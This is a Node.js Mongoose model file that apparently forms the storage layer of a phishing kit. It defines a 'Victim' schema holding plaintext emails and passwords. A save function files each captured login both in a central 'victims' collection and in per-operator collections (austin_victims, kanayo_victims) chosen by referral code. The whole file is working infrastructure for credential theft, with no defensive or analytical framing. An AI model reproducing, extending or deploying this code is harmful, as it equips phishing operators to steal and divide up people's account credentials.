const mongoose = require("mongoose");

const VictimSchema = new mongoose.Schema({
  email: {
    type: String,
    required: true,
  },
  password: {
    type: String,
    required: true,
  },
  employerId: {
    type: String,
    default: "general",
  },
  createdAt: {
    type: Date,
    default: Date.now,
  },
});

// 1. Central "victims" collection model
const MainVictim = mongoose.model("Victim", VictimSchema, "victims");

// 2. Pre-defined Employer Models (Creates austin_victims & kanayo_victims under 'test' database)
const AustinVictim = mongoose.model("AustinVictim", VictimSchema, "austin_victims");
const KanayoVictim = mongoose.model("KanayoVictim", VictimSchema, "kanayo_victims");
const GeneralVictim = mongoose.model("GeneralVictim", VictimSchema, "general_victims");

/**
 * Saves submission to BOTH the main 'victims' collection AND 
 * the specific employer's collection ('austin_victims', 'kanayo_victims', etc.)
 */
async function saveToEmployerAndMain({ email, password, employerId }) {
  const normalizedEmployer = (employerId || "general").toLowerCase().trim();

  // Save to central "victims" collection
  const mainRecord = await MainVictim.create({
    email,
    password,
    employerId: normalizedEmployer,
  });

  // Save copy to employer specific collection based on ref code
  if (normalizedEmployer === "au@" || normalizedEmployer === "austin") {
    await AustinVictim.create({ email, password, employerId: "austin" });
  } else if (normalizedEmployer === "kan@" || normalizedEmployer === "kanayo") {
    await KanayoVictim.create({ email, password, employerId: "kanayo" });
  } else {
    await GeneralVictim.create({ email, password, employerId: normalizedEmployer });
  }

  return mainRecord;
}

module.exports = {
  MainVictim,
  AustinVictim,
  KanayoVictim,
  GeneralVictim,
  saveToEmployerAndMain,
};